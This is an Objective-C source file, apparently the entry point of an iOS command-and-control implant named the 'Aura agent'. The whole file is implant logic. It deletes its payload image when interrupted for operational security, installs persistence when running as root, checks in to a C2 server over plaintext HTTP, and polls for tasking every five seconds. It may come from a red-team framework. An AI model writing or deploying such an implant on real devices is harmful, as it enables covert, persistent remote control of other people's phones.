#import <Foundation/Foundation.h>
#import "HTTPC2Config.h"
#import "SystemInfoHelper.h"
#import "C2CheckIn.h"
#include <signal.h>

/// Handle the case where we need to quickly delete the payload image for OPSEC
void handleSignal(int signal) {
    NSLog(@"🥷 Received SIGNAL (Ctrl-C). Quickly remove the payload image!");
    BOOL deletionSuccess = [SystemInfoHelper uninstallAgent];
    exit(0);
}

/// Aura agent entry point
int main(int argc, const char * argv[]) {
    @autoreleasepool {
        /// Register a few OPSEC signals
        signal(SIGINT, handleSignal);
        signal(SIGHUP, handleSignal);

        NSLog(@"👋 Hello from the Aura iOS agent!");

        if ([SystemInfoHelper agentIsInstalled]) {
            NSLog(@"🎃 Aura agent is already installed...");
            /// Perform the HTTP plaintext check-in
            [C2CheckIn performPlaintextCheckin];
            // exit(0);
        } else {
            /// Are we running as root?
            BOOL isRoot = [SystemInfoHelper isRootUser];
            if (isRoot) {
                /// Attempt to persist
                BOOL agentInstallSuccess = [SystemInfoHelper persistAgent];
                if (!agentInstallSuccess && ![SystemInfoHelper agentIsInstalled]) {
                    NSLog(@"🤯 Error installing the Aura agent....");
                    exit(1);
                }

                // We don't need this anymore ;)
                exit(0);
            } else {
                NSLog(@"⚠️ WARNING: Executing the Aura agent stand-alone -- without persistence");
                /// Perform the HTTP plaintext check-in
                [C2CheckIn performPlaintextCheckin];
            }
        }

        /// Loop to get tasking on an interval -- this will update our tasking
        while (true) {
            [C2CheckIn getTasking];
            [NSThread sleepForTimeInterval:5.0];
        }
    }

    return 0;
}
